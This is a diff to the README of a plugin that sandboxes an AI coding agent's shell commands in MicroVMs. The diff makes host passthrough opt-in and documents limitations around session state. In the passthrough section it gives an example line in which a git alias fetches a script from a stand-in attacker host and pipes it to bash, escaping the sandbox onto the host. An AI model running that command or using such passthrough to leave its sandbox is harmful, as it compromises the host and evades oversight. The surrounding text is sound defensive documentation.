@@ -173,21 +173,38 @@ python3 exec_backend.py --session <session-id> --reset
 | `E2B_API_KEY` | `e2b_000000` | Any non-empty string for local deployments |
 | `SSL_CERT_FILE` | — | mkcert CA, needed because the SDK uses HTTPS |
 | `CUBE_OPENCODE_PYTHON` | `python3` | Interpreter running the backend; set for venvs |
-| `CUBE_OPENCODE_PASSTHROUGH` | `git,gh,opencode` | Commands that stay on the host |
+| `CUBE_OPENCODE_PASSTHROUGH` | empty | Commands that stay on the host; nothing by default |
 | `CUBE_OPENCODE_TIMEOUT` | `120` | Per-command timeout in seconds |
 | `CUBE_OPENCODE_STATE_DIR` | `~/.cache/cubesandbox-opencode` | Where session state is kept |
 
-### Why `git` stays on the host
+### Passthrough, and why `git` is not on it by default
 
-The sandbox has its own filesystem. Running `git commit` there would operate on
-a different repository than the one OpenCode edits through `read` / `write` /
-`edit`, so the commit would not contain your changes.
+Passthrough is an arbitrary-host-execution escape hatch, not a narrow exception.
+Matching is on the leading token only, so allowing `git` allows every
+`git`-prefixed command — and git can be made to run arbitrary shell:
 
-Redirect everything with `CUBE_OPENCODE_PASSTHROUGH=`, but then expect the agent
-to lose access to your git history.
+```bash
+git -c alias.x='!curl http://attacker/sh | bash' x
+```
 
-Matching is on the leading token only. `git status` passes through;
-`foo && git push` does not, because a compound command may contain anything.
+That executes on the host, unsandboxed and unlogged. The model's commands are
+the untrusted input this plugin exists to contain, so the default list is empty.
+
+The cost of that default is real, and it is why the mechanism exists at all: the
+sandbox has its own filesystem, so `git commit` executed there operates on a
+different repository than the one OpenCode edits through `read` / `write` /
+`edit`, and the commit would not contain your changes. If the agent needs host
+git, opt in explicitly:
+
+```bash
+export CUBE_OPENCODE_PASSTHROUGH=git,gh
+```
+
+Treat anything on that list as fully trusted with host privileges.
+
+Once opted in, matching is still on the leading token only: `git status` passes
+through, `foo && git push` does not, because a compound command may contain
+anything.
 
 ## Tests
 
@@ -195,7 +212,7 @@ Matching is on the leading token only. `git status` passes through;
 node tests/test_plugin.mjs
 ```
 
-21 assertions covering rewriting, passthrough, idempotence, session-id
+24 assertions covering rewriting, passthrough, idempotence, session-id
 handling, and quote-injection resistance. Node standard library only — no npm
 install, no network, no CubeSandbox deployment required.
 
@@ -275,9 +292,15 @@ completely — plugins load at startup only.
 2. **`read` / `write` / `edit` are not sandboxed.** See "Security boundaries".
 3. **Hook payload shape is not a stable contract.** The session id key has been
    spelled differently across OpenCode versions, so several variants are probed
-   with a fallback. A missed key costs sandbox-reuse granularity, never
-   isolation.
-4. **Interactive commands do not work.** Output is captured, so anything
+   with a fallback. If every known key is missing, all sessions collapse onto
+   one shared state file and lock, so cwd and exported environment bleed
+   between concurrent sessions. Commands still run in a MicroVM, so this is not
+   a host escape, but it is more than a loss of reuse granularity.
+4. **A command that calls `exec` loses its state update.** `exec` replaces
+   the shell process image, discarding the trap that emits the state block. The
+   previous session state is kept, so cwd and environment are stale rather than
+   wrong. `exit` is handled correctly; only `exec` is affected.
+5. **Interactive commands do not work.** Output is captured, so anything
    expecting a TTY (`vim`, `top`) will not behave normally.
 
 ## Verified environment
@@ -293,7 +316,7 @@ Everything above was exercised on:
 | `/data/cubelet` | XFS with `reflink=1` |
 | Sandbox creation | ~1.0 s |
 | Full run_code cycle | ~2.4 s |
-| Plugin tests | 21/21 passing |
+| Plugin tests | 24/24 passing |
 
 ## Files
 
@@ -302,7 +325,7 @@ Everything above was exercised on:
 | `plugin/cubesandbox-bash.js` | The `tool.execute.before` hook |
 | `plugin/install.sh` | Idempotent install / uninstall / status |
 | `exec_backend.py` | Runs one command in a MicroVM; keeps session state |
-| `tests/test_plugin.mjs` | 21 offline assertions |
+| `tests/test_plugin.mjs` | 24 offline assertions |
 | `.env.example` | Every setting, documented |
 
 ## References
